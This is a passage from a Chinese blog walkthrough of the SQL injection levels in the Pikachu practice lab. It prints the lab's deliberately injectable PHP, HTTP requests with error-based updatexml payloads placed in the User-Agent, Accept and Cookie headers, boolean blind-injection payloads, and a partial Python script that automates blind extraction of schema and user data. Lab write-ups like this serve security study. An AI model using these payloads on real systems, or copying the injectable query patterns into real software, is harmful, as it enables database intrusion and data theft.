class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 源码</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># array_key_exists() 函数</span></span><br><span class="line"><span class="comment"># 检查某个数组中是否存在指定的键名，如果键名存在则返回 true，如果键名不存在则返回 false。</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># mysqli_affected_rows() 函数</span></span><br><span class="line"><span class="comment"># 返回前一次 MySQL 操作（SELECT、INSERT、UPDATE、REPLACE、DELETE）所影响的记录行数。</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$link</span>=<span class="title function_ invoke__">connect</span>();</span><br><span class="line"><span class="variable">$html</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">array_key_exists</span>(<span class="string">&quot;message&quot;</span>,<span class="variable">$_POST</span>) &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;message&#x27;</span>]!=<span class="literal">null</span>)&#123;</span><br><span class="line">    <span class="comment">//插入转义</span></span><br><span class="line">    <span class="variable">$message</span>=<span class="title function_ invoke__">escape</span>(<span class="variable">$link</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;message&#x27;</span>]);</span><br><span class="line">    <span class="variable">$query</span>=<span class="string">&quot;insert into message(content,time) values(&#x27;<span class="subst">$message</span>&#x27;,now())&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span>=<span class="title function_ invoke__">execute</span>(<span class="variable">$link</span>, <span class="variable">$query</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">mysqli_affected_rows</span>(<span class="variable">$link</span>)!=<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="variable">$html</span>.=<span class="string">&quot;&lt;p&gt;出现异常，提交失败！&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// if(array_key_exists(&#x27;id&#x27;, $_GET) &amp;&amp; is_numeric($_GET[&#x27;id&#x27;]))&#123;</span></span><br><span class="line"><span class="comment">//没对传进来的id进行处理，导致DEL注入</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">array_key_exists</span>(<span class="string">&#x27;id&#x27;</span>, <span class="variable">$_GET</span>))&#123;</span><br><span class="line">    <span class="variable">$query</span>=<span class="string">&quot;delete from message where id=<span class="subst">&#123;$_GET[&#x27;id&#x27;]&#125;</span>&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span>=<span class="title function_ invoke__">execute</span>(<span class="variable">$link</span>, <span class="variable">$query</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">mysqli_affected_rows</span>(<span class="variable">$link</span>)==<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&quot;location:sqli_del.php&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$html</span>.=<span class="string">&quot;&lt;p style=&#x27;color: red&#x27;&gt;删除失败,检查下数据库是不是挂了&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="“http-header”注入"><a href="#“http-header”注入" class="headerlink" title="“http header”注入"></a>“http header”注入</h2><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># 真·见框就x</span><br><span class="line"># 太菜了，看下提示：admin/<span class="number">123456</span></span><br><span class="line"># 好了，中招了</span><br><span class="line"># </span><br><span class="line">朋友，你好，你的信息已经被记录了：点击退出</span><br><span class="line">你的ip地址:<span class="number">192.168</span>.<span class="number">135.128</span></span><br><span class="line">你的user agent:Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; WOW64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">45.0</span>.<span class="number">2454.93</span> Safari/<span class="number">537.36</span></span><br><span class="line">你的http accept:text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,*/*;q=<span class="number">0.8</span></span><br><span class="line">你的端口（本次连接）:tcp50042</span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"># 已被记录User-agents等信息！这是与数据库交互了呗</span><br><span class="line"># 先抓个包分析登录请求，User-Agent和Accept、ip、port参数可控</span><br><span class="line"># 再比对下数据库，确实了。记下数据库路劲：pikachu/httpinfo</span><br><span class="line"># 登录时请求</span><br><span class="line"># </span><br><span class="line"><span class="keyword">POST</span> <span class="string">/vul/sqli/sqli_header/sqli_header_login.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.135.130:49154</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://192.168.135.130:49154/vul/sqli/sqli_header/sqli_header_login.php</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=lc7ll418j82rovatgm64brnf5j</span><br><span class="line"><span class="attribute">DNT</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>42</span><br><span class="line"></span><br><span class="line"><span class="language-pgsql">username=<span class="keyword">admin</span>&amp;<span class="keyword">password</span>=<span class="number">123456</span>&amp;submit=<span class="keyword">Login</span></span></span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># 憨憨如我，一直尝试登录界面的请求，而没在意登陆成功后的响应</span><br><span class="line"># 这不就来了吗</span><br><span class="line"># </span><br><span class="line"># You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#x27;,&#x27;51013&#x27;)&#x27; at line 1</span><br><span class="line"># </span><br><span class="line"># 登录成功后的响应</span><br><span class="line"><span class="keyword">GET</span> <span class="string">/vul/sqli/sqli_header/sqli_header.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.135.130:49154</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>&#x27;</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>ant[uname]=admin; ant[pw]=10470c3b4b1fed12c3baac014be15fac67c6e815; PHPSESSID=lc7ll418j82rovatgm64brnf5j</span><br><span class="line"><span class="attribute">DNT</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"># payload 和前面的基本一样，整个经典滴例子</span><br><span class="line"># 请求</span><br><span class="line"># </span><br><span class="line"><span class="keyword">GET</span> <span class="string">/vul/sqli/sqli_header/sqli_header.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.135.130:49154</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>tumei&#x27; and updatexml(1,concat(0x7e,database()),0) and &#x27;</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>ant[uname]=admin; ant[pw]=10470c3b4b1fed12c3baac014be15fac67c6e815; PHPSESSID=lc7ll418j82rovatgm64brnf5j</span><br><span class="line"><span class="attribute">DNT</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"># </span><br><span class="line"># 部分响应</span><br><span class="line">        &lt;div class=&quot;sidebar-toggle sidebar-collapse&quot; id=&quot;sidebar-collapse&quot;&gt;</span><br><span class="line">            &lt;i id=&quot;sidebar-toggle-icon&quot; class=&quot;ace-icon fa fa-angle-double-left ace-save-state&quot; data-icon1=&quot;ace-icon fa fa-angle-double-left&quot; data-icon2=&quot;ace-icon fa fa-angle-double-right&quot;&gt;&lt;/i&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">XPATH syntax error: &#x27;~pikachu&#x27;</span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"># 其他注入点</span><br><span class="line"># 试了下，仅有UA和Accept可进行注入，对Host进行注入你猜能连得上吗</span><br><span class="line"># </span><br><span class="line"><span class="keyword">GET</span> <span class="string">/vul/sqli/sqli_header/sqli_header.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.135.130:49154</span><br><span class="line">User-Agent:0xtlu.me</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span> tumei&#x27; and updatexml(1,concat(0x7e,database()),0) and &#x27;</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>ant[uname]=admin; ant[pw]=10470c3b4b1fed12c3baac014be15fac67c6e815; PHPSESSID=lc7ll418j82rovatgm64brnf5j</span><br><span class="line"><span class="attribute">DNT</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"># </span><br><span class="line"># 报错响应</span><br><span class="line">XPATH syntax error: &#x27;~pikachu&#x27;</span><br><span class="line"># </span><br><span class="line"># </span><br><span class="line"># </span><br><span class="line"># cookie 注入</span><br><span class="line"># 再看一眼后台请求，这cookie有点意思，直接用ant数组存储账密，这是与数据库交互了吧</span><br><span class="line"># Cookie: ant[uname]=admin; ant[pw]=10470c3b4b1fed12c3baac014be15fac67c6e815; PHPSESSID=lc7ll418j82rovatgm64brnf5j</span><br><span class="line"># 试一波单引号，阔以；报错注入，哦豁</span><br><span class="line"># </span><br><span class="line">GET /vul/sqli/sqli_header/sqli_header.php HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.135.130:49154</span><br><span class="line">User-Agent:0xtlu.me</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span> 0xtlu.me</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>ant[uname]=admin&#x27; or updatexml(9, concat(&#x27;~&#x27;, database(), &#x27;~&#x27;),0) or &#x27;; ant[pw]=10470c3b4b1fed12c3baac014be15fac67c6e815; PHPSESSID=lc7ll418j82rovatgm64brnf5j</span><br><span class="line"><span class="attribute">DNT</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br></pre></td></tr></table></figure><h2 id="盲注-base-on-boolian"><a href="#盲注-base-on-boolian" class="headerlink" title="盲注(base on boolian)"></a>盲注(base on boolian)</h2><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># 随便写入 admin ，提示不存在，该输入 lucy ，返回 id 和 email</span><br><span class="line"># 看下url，<span class="keyword">name</span>拼接输入内容（lucy）；再加个单引号，还是不存在；再加个注释（#），咋没提示</span><br><span class="line"># 看下官方提示（admin/<span class="number">123456</span>），啥玩意？</span><br><span class="line"># lucy<span class="comment">&#x27; AND TRUE#，可以呀，试下永真式（lucy&#x27; or 1=1#），不存在？ AND关键字都行，不可能我 OR 不行的，比对源码，解析在下一个代码块</span></span><br><span class="line"># </span><br><span class="line"># 看了下其他师傅的，通过 <span class="comment">&#x27;and&#x27;关键字构造《真事件TRUE》来判断字符存在（and事件成立，则提示id和email，反之提示不存在）。</span></span><br><span class="line"># 写入假事件（lucy<span class="comment">&#x27; and FALSE #），其中and左边为TRUE，右边为FALSE，提示不存在，完整sql：</span></span><br><span class="line">select id,email from member where username=<span class="comment">&#x27;lucy&#x27; and FALSE #&#x27;</span></span><br><span class="line"># 写入真事件，上面的 FALSE 改为 TRUE 就行</span><br><span class="line"># sql语法中，<span class="comment">&#x27;=&#x27;符号为if等条件判断中使用；</span></span><br><span class="line"># 来个小栗子好理解，输入 lucy<span class="comment">&#x27; and substring(database(),1,1)=&#x27;p&#x27;#</span></span><br><span class="line"># 上述写入理解：使用 database() 函数获取当前数据库名（字符串），使用 substring() 函数拿取字符串位序为<span class="number">1</span>开始的<span class="number">1</span>个字符，通过<span class="comment">&#x27;==&#x27;判断字符与猜想的（此处为&#x27;p&#x27;）是否一致，此处 and 的右边为TRUE，整个sql语句正确，提交显示 lucy 的id和email。</span></span><br><span class="line"># 通过bp的爆破模块，将 substring() 函数的第<span class="number">2</span>参数作为第<span class="number">1</span>变量（字典：<span class="number">1</span>到正无穷），将猜想 p 作为第<span class="number">2</span>变量（字典：a-z、A-Z、<span class="number">1</span>-<span class="number">9</span>、特殊字符）</span><br><span class="line"># 看到这，是不是很想sqlmap的报库名环节，不断猜想。现在，让我们来试试python爬虫</span><br><span class="line"># python 脚本如下个代码块</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 源码</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># 比较 mysqli_num_rows() 函数返回记录数，为一条记录则输出其中的 id 和 email 字段</span></span><br><span class="line"><span class="comment"># # 当输入永真式(luc&#x27; OR TRUE)时，列出member表中所有记录，则记录数不为1，故执行 else 语句</span></span><br><span class="line"><span class="comment"># 使用限制显示记录的关键字：limit；使用限制偏移量的关键字：offset。展示：</span></span><br><span class="line"><span class="comment"># luc&#x27; OR TRUE limit 1 offset 2#</span></span><br><span class="line"><span class="comment"># 单条记录显示，如果我想拉取所有数据呢？怎么来？爬虫！</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># 等下啦，先看看如何显示当前数据库名，UNION 连接两个 SELECT 语句，仍是使用 LIMIT 和 OFFSET 限制记录数和显示那条记录。</span></span><br><span class="line"><span class="comment"># 如下，第一条 SELECT 语句得到一条空记录，第二条 SELECT 语句获得（id=1，email=‘当前数据库名’）</span></span><br><span class="line"><span class="comment"># a&#x27; UNION select 1, database() LIMIT 1 OFFSET 1#</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># mysqli_fetch_assoc() 函数从结果集中取得一行作为关联数组</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$html</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;submit&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]!=<span class="literal">null</span>)&#123;</span><br><span class="line">    <span class="variable">$name</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];<span class="comment">//这里没有做任何处理，直接拼到select里面去了</span></span><br><span class="line">    <span class="variable">$query</span>=<span class="string">&quot;select id,email from member where username=&#x27;<span class="subst">$name</span>&#x27;&quot;</span>;<span class="comment">//这里的变量是字符型，需要考虑闭合</span></span><br><span class="line">    <span class="comment">//mysqi_query不打印错误描述,即使存在注入,也不好判断</span></span><br><span class="line">    <span class="variable">$result</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$link</span>, <span class="variable">$query</span>);<span class="comment">//</span></span><br><span class="line"><span class="comment">//     $result=execute($link, $query);</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$result</span> &amp;&amp; <span class="title function_ invoke__">mysqli_num_rows</span>(<span class="variable">$result</span>)==<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">while</span>(<span class="variable">$data</span>=<span class="title function_ invoke__">mysqli_fetch_assoc</span>(<span class="variable">$result</span>))&#123;</span><br><span class="line">            <span class="variable">$id</span>=<span class="variable">$data</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">            <span class="variable">$email</span>=<span class="variable">$data</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line">            <span class="variable">$html</span>.=<span class="string">&quot;&lt;p class=&#x27;notice&#x27;&gt;your uid:<span class="subst">&#123;$id&#125;</span> </span></span><br><span class="line"><span class="string">your email is: <span class="subst">&#123;$email&#125;</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$html</span>.=<span class="string">&quot;&lt;p class=&#x27;notice&#x27;&gt;您输入的username不存在，请重新输入！&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python脚本</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="comment"># 需要参数内容</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 Edg/97.0.1072.55&#x27;</span></span><br><span class="line">&#125;;</span><br><span class="line">url = <span class="string">&#x27;http://192.168.135.130:49154/vul/sqli/sqli_blind_b.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># grammar = &#x27;database()&#x27;</span></span><br><span class="line"><span class="comment"># 存储各个查询命令</span></span><br><span class="line">grammars = [<span class="string">&#x27;database()&#x27;</span>, <span class="string">&#x27;(SELECT GROUP_CONCAT(DISTINCT TABLE_SCHEMA) FROM information_schema.TABLES)&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;(SELECT GROUP_CONCAT(DISTINCT TABLE_NAME) FROM information_schema.TABLES WHERE TABLE_SCHEMA=&quot;pikachu&quot;)&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;(SELECT GROUP_CONCAT(DISTINCT COLUMN_NAME) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA=&quot;pikachu&quot;)&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;(SELECT GROUP_CONCAT(DISTINCT username) FROM pikachu.member)&#x27;</span>]</span><br><span class="line">num = <span class="number">0</span></span><br><span class="line"><span class="comment"># grammar = &#x27;&#x27;</span></span><br><span class="line"><span class="comment"># sql 语法不区分字母大小写</span></span><br><span class="line">guess = <span class="string">&#x27;abcdefghigklmnopqrstuvwxyz0123456789@_.,&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 循环使用各个语句</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">loop</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">enumerate</span>(grammars):</span><br><span class="line">        <span class="built_in">print</span>(i[<span class="number">1</span>] + <span class="string">&quot;--&gt;&quot;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        grammar = i[<span class="number">1</span>]</span><br><span class="line">        parameter(grammar)</span><br><span class="line">        <span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 处理参数语句</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parameter</span>(<span class="params">data</span>):</span><br><span class="line">    values = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    length = <span class="number">0</span></span><br><span class="line">    flag = <span class="literal">False</span></span><br><span class="line">    <span class="comment"># 获取数据库名长度</span></span><br><span class="line">    <span class="comment"># for i in range(1, 100):</span></span><br><span class="line">    <span class="comment">#     # 检测当前数据库名长度</span></span><br><span class="line">    <span class="comment">#     # values = &quot;lucy&#x27; and length(grammar)=&#123;num&#125;#&quot;.format(num=i)</span></span><br><span class="line">    <span class="comment">#     # 拿到 information_schema.TABLES 的字段 TABLE_SCHEMA 下所有不重复值成组长度</span></span><br><span class="line">    <span class="comment">#     values = &quot;lucy&#x27; and (SELECT length(GROUP_CONCAT(DISTINCT TABLE_SCHEMA)) FROM information_schema.TABLES)=&#123;num&#125;#&quot;.format(</span></span><br><span class="line">    <span class="comment">#         num=i)</span></span><br><span class="line">    <span class="comment">#     # print(values)</span></span><br><span class="line">    <span class="comment">#     flag = query(values)</span></span><br><span class="line">    <span class="comment">#     if flag:</span></span><br><span class="line">    <span class="comment">#         print(&quot;数据库名长度：&quot; + str(i))</span></span><br><span class="line">    <span class="comment">#         length = i</span></span><br><span class="line">    <span class="comment">#         # return i</span></span><br><span class="line">    <span class="comment"># for i in range(1, length + 1):</span></span><br><span class="line">    flag = <span class="literal">False</span></span><br><span class="line">    isnum = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">1024</span>):</span><br><span class="line">        <span class="comment"># for j in range(0, len(guess) + 1):</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span 